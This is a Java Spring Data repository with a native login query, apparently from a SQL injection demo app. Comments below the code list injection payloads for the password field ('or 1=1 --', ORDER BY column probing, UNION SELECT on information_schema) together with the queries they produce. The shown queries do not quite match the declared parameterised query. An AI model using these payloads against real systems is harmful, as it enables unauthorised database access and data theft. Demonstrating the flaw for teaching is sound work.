package app.data;

import java.util.List;

import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

public interface UserDao extends CrudRepository<UserEntity, String> {

	@Query(value = "SELECT * FROM users userentity0_ WHERE userentity0_.username=?1 AND userentity0_.hash_code=?2", nativeQuery = true)
	public List<Object[]> loginNative(
			String username,
			String hash);
}


//----- run /initializeDB before ---


// -------------- To get all users ---------------
// USERNAME =    User1 , Password =   ' or 1=1 --   
// SELECT username,hash_code FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 -- '

// -------------- To get num of columns in users ---------------
// USERNAME =    User1 , Password =   ' or 1=1 ORDER BY 7 --   
// SELECT * FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 ORDER BY 7 -- '

//-------------- To get all tables names in DB ---------------
//USERNAME =    User1 , Password =   ' or 1=1 UNION SELECT table_schema,table_name FROM information_schema.tables --
// SELECT username,hash_code FROM users userentity0_ WHERE userentity0_.username='User1' AND userentity0_.hash_code=' ' or 1=1 UNION SELECT table_schema,table_name FROM information_schema.tables -- '


